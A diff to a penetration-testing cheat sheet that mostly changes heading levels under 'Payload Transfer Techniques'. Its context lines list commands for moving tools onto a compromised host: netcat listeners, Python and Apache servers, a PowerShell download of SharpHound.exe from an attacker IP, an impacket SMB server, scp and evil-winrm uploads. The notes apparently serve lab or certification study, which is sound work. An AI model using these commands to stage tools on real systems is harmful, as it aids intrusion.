@@ -732,14 +732,14 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 
 ### [PAYLOAD TRANSFER TECHNIQUES](#)
 
-##### Netcat
+###### Netcat
 - Using Netcat
     - We need to have netcat listerner on target machine with `>` so whatever werecieve get stored in `'test.txt`
         - `nc.exe -nlvp 1234 > test.txt`
     - Sned file from your machine
         - `nc -nv 10.5.19.93 1234 < test.txt`
 
-##### HTTP Server
+###### HTTP Server
 - HTTP Server on kali
     - `service apache2 start`
     - `python -m SimpleHTTPServer 80`
@@ -757,13 +757,13 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
             - on powershell run this to copy sharphound zip file for example
                 - `Invoke-WebRequest http://10.50.47.247/SharpHound.exe -OutFile SharpHound.exe`
 
-##### FTP Server
+###### FTP Server
 - FTP Server on kali
     - `python -m pyftpdlib -p 21`
     - Fetching file
         - `get <filname>`
 
-##### SMB Server
+###### SMB Server
 - SMB Server on kali
     - `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .  ` 
     - Fetching file
@@ -792,6 +792,7 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
             - Syntex
                 - `scp user@remotehost:/home/user/file_name user2@remotehost2.com:/remote/directory`
 
+##### Transfer when you are Pivoted
 ###### Evil-winrm
 - Uploading via WinRM CLI
     - upload and download
